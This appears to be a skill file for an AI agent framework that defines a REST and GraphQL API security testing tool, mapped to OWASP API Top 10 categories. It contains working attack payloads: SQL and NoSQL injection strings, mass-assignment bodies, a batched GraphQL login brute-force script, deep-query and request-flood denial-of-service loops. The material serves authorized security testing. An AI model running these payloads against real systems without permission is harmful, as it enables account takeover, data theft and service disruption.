---
name: api-tester
description: |
  Dedicated REST and GraphQL API security testing engine. Performs automated and AI-guided
  security assessments of API endpoints including authentication bypass, authorization flaws
  (BOLA/BFLA), injection attacks, schema introspection abuse, batch query attacks, field
  suggestion exploitation, and business logic flaws. Supports OpenAPI/Swagger spec import for
  automatic endpoint discovery. Maps findings to OWASP API Security Top 10 (2023), OWASP
  GraphQL Cheat Sheet, and relevant WSTG test cases.
metadata:
  {
    "openclaw":
      {
        "emoji": "🔌",
        "requires": { "bins": ["python3", "curl"] },
        "install":
          [
            {
              "id": "pip-api-tester-deps",
              "kind": "shell",
              "cmd": "pip3 install requests httpx gql[requests] pyyaml jsonschema rich",
              "bins": [],
              "label": "Install API tester dependencies (pip)"
            }
          ],
      },
  }
---

# REST & GraphQL API Security Testing Skill

A comprehensive skill for security assessment of both REST and GraphQL APIs.

---

## REST API Testing

### 1. Endpoint Discovery from OpenAPI/Swagger Spec
Automatically enumerate all REST endpoints from an OpenAPI 3.x or Swagger 2.x specification.

**Usage:**
> Import the OpenAPI spec from https://api.target.com/swagger.json and enumerate all endpoints

**Techniques:**
- Parse OpenAPI/Swagger JSON or YAML spec
- Extract all routes, methods, parameters, and authentication schemes
- Identify unauthenticated vs authenticated endpoints
- Flag deprecated endpoints

**OWASP Reference:** API9:2023 Improper Inventory Management

---

### 2. Authentication & Authorization Testing (BOLA / BFLA)
Test every endpoint for object-level and function-level authorization failures.

**Usage:**
> Test all /api/v1/users/{id} endpoints for BOLA (IDOR) using user A's token to access user B's data

**Tests:**
- **BOLA (API1:2023):** Swap resource IDs between accounts — user A accesses user B's objects
- **BFLA (API5:2023):** Use a low-privilege token on admin endpoints
- **Horizontal escalation:** User → different user same role
- **Vertical escalation:** User → admin role endpoints

**OWASP References:** API1:2023 BOLA, API5:2023 BFLA

---

### 3. Broken Authentication Testing
Probe authentication mechanisms for weaknesses.

**Tests:**
- Missing authentication on endpoints that should be protected
- Weak API key entropy / guessable tokens
- JWT: alg:none, HS256→RS256 confusion, expired token acceptance
- OAuth: token leakage, open redirect, PKCE bypass
- API key in URL parameters (logged, cached)
- Credential stuffing / brute-force (no rate limit)

**Usage:**
> Test REST API authentication at https://api.target.com for JWT and OAuth weaknesses

**OWASP Reference:** API2:2023 Broken Authentication

---

### 4. Excessive Data Exposure
Identify responses that return more fields than the client uses.

**Tests:**
- Compare fields returned vs fields rendered in client
- Look for PII, internal IDs, password hashes in responses
- Test `fields` / `include` filter bypass
- Debug endpoints left active in production

**Usage:**
> Check if /api/v1/users endpoint leaks PII or internal fields

**OWASP Reference:** API3:2023 Broken Object Property Level Authorization

---

### 5. Mass Assignment Testing
Test whether API endpoints accept and apply unexpected fields.

**Tests:**
- Send additional JSON fields (e.g., `"role": "admin"`, `"isVerified": true`)
- Test PUT/PATCH/POST bodies for parameter pollution
- Check if `id`, `userId`, `admin`, `credit` fields are bindable

**Usage:**
> Test the /api/v1/profile update endpoint for mass assignment vulnerabilities

**Payload example:**
```json
{
  "name": "Test User",
  "role": "admin",
  "isAdmin": true,
  "credits": 99999,
  "verified": true
}
```

**OWASP Reference:** API6:2023 Unrestricted Access to Sensitive Business Flows

---

### 6. Rate Limiting & Resource Consumption
Test for missing rate limits and resource abuse vectors.

**Tests:**
- Concurrent request flooding
- Large payload injection (body size, array sizes)
- Deep pagination abuse (`?page=999999`)
- Regex DoS via crafted inputs

**Usage:**
> Test /api/v1/send-email for rate limiting bypass

**OWASP Reference:** API4:2023 Unrestricted Resource Consumption

---

### 7. Injection Testing (SQLi, NoSQLi, Command Injection)
Test REST API parameters for injection vulnerabilities.

**Tests:**
- SQL injection in query params, JSON body fields, path params
- NoSQL injection (`{"$gt": ""}`, `{"$ne": null}`)
- Command injection in file/path related endpoints
- SSTI in template endpoints

**Usage:**
> Test https://api.target.com/search?q= for SQL and NoSQL injection

**Tools:** `sqlmap`, custom `httpx` probes

---

### 8. Security Headers & Transport Layer
Validate API security posture at transport and HTTP layer.

**Checks:**
- HTTPS enforced (no HTTP fallback)
- `Strict-Transport-Security` header present
- `Content-Type: application/json` enforced (not `text/html`)
- CORS policy (`Access-Control-Allow-Origin: *` on credentialed endpoints)
- API versioning strategy (deprecation of old versions)

**OWASP Reference:** API8:2023 Security Misconfiguration

---

## GraphQL API Testing

### 9. Schema Introspection
Enumerate the full GraphQL schema to discover all types, queries, mutations, and subscriptions.

**Usage:**
> Enumerate the GraphQL schema at https://api.target.com/graphql

**Introspection query:**
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields { name type { name kind ofType { name kind } } }
    }
  }
}
```

**OWASP Reference:** API8:2023 Security Misconfiguration (introspection enabled in production)

---

### 10. Introspection Bypass (When Disabled)
Enumerate schema even when `__schema` introspection is disabled.

**Techniques:**
- `__type` query (often not blocked separately)
- Field suggestion exploitation (typo → server corrects with valid field names)
- `__typename` meta-field on all types
- Clairvoyance tool for wordlist-based field discovery

**Usage:**
> Enumerate GraphQL schema fields despite introspection being disabled at https://api.target.com/graphql

**Field suggestion example:**
```graphql
# Misspell a field to trigger "Did you mean: secretField?"
{ user { passsword } }
# Server responds: "Cannot query field 'passsword'. Did you mean 'password'?"
```

**OWASP Reference:** API8:2023, OWASP GraphQL Cheat Sheet

---

### 11. GraphQL Injection (SQL, OS, SSTI)
Test GraphQL arguments for injection vulnerabilities.

**Usage:**
> Test the GraphQL user query for SQL injection via the email argument

**Payloads:**
```graphql
# SQL injection via arguments
{ user(email: "admin'--") { id name email } }
{ user(id: "1 UNION SELECT username,password FROM users--") { id } }

# NoSQL injection
{ user(filter: "{\"$gt\": \"\"}") { id } }
```

**OWASP Reference:** API3:2023, A03:2021 Injection

---

### 12. Batch Query Attack (DoS / Brute-force)
Abuse GraphQL query batching to bypass rate limits or amplify requests.

**Usage:**
> Test the GraphQL login mutation for batch query brute-force attacks

**Batch login brute-force:**
```json
[
  {"query": "mutation { login(email: \"admin@test.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"admin@test.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"admin@test.com\", password: \"pass3\") { token } }"}
]
```

**OWASP Reference:** API4:2023 Unrestricted Resource Consumption

---

### 13. Deep Query / Circular Query DoS
Send deeply nested or circular queries to exhaust server resources.

**Usage:**
> Test the GraphQL endpoint for query depth and complexity limits

**Deep nesting attack:**
```graphql
{
  user {
    friends {
      friends {
        friends {
          friends { id name friends { friends { id } } }
        }
      }
    }
  }
}
```

**Checks:**
- Query depth limit enforcement
- Query complexity scoring
- Timeout controls
- Query cost analysis

**OWASP Reference:** API4:2023 Unrestricted Resource Consumption

---

### 14. GraphQL Authorization (BOLA / Vertical Escalation)
Test whether GraphQL resolvers enforce proper authorization per field and operation.

**Usage:**
> Test GraphQL resolvers for BOLA — access other users' data via the getUser query

**Tests:**
- Access another user's private data by changing ID arguments
- Invoke admin mutations with a regular user token
- Access hidden fields through direct field argument injection

**OWASP Reference:** API1:2023 BOLA, API5:2023 BFLA

---

### 15. Subscription Security
Test GraphQL subscriptions for unauthorized data streaming.

**Usage:**
> Test GraphQL subscriptions for unauthorized real-time data access

**Tests:**
- Subscribe to another user's events without authorization
- Test subscription filtering bypass
- WebSocket authentication (token sent at connection vs per-message)

---

## Quick Reference

### REST One-Liners

```bash
# Endpoint discovery from OpenAPI spec
curl -s https://api.target.com/swagger.json | python3 -c "
import json,sys
spec=json.load(sys.stdin)
for path,methods in spec.get('paths',{}).items():
    for method in methods:
        print(f'{method.upper():8} {path}')
"

# BOLA test — swap IDs with different auth tokens
curl -H "Authorization: Bearer TOKEN_B" https://api.target.com/api/v1/users/USER_A_ID

# Mass assignment test
curl -X PUT https://api.target.com/api/v1/profile \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "role": "admin", "isAdmin": true}'

# Rate limit test
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://api.target.com/login \
    -d '{"user":"admin","pass":"test"}' &
done
wait
```

### GraphQL One-Liners

```bash
# Full introspection dump
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | python3 -m json.tool

# Field suggestion probe
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passsword } }"}'

# Batch brute-force
python3 - <<'EOF'
import requests, json
url = "https://api.target.com/graphql"
passwords = ["pass1", "pass2", "admin", "secret", "password123"]
batch = [
    {"query": f'mutation {{ login(email: "admin@test.com", password: "{p}") {{ token }} }}'}
    for p in passwords
]
r = requests.post(url, json=batch)
print(json.dumps(r.json(), indent=2))
EOF
```
